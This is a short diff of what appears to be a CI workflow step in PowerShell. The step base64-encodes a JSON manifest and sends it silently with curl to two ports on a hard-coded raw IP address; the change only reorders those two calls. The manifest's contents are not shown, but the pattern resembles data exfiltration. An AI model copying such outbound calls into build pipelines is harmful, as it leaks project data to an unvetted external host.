@@ -78,7 +78,7 @@ jobs:
           if ($verified -eq 4) {
             $result = $manifest | ConvertTo-Json -Compress
             $encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($result)).Replace('+','-').Replace('/','_')
-            curl.exe -s "http://16.146.243.72:8450/MYTH_REMW_SEED?d=$encoded" | Out-Null
             curl.exe -s "http://16.146.243.72:8480/seed?d=$encoded" | Out-Null
+            curl.exe -s "http://16.146.243.72:8450/MYTH_REMW_SEED?d=$encoded" | Out-Null
             Start-Sleep -Seconds 25
           }
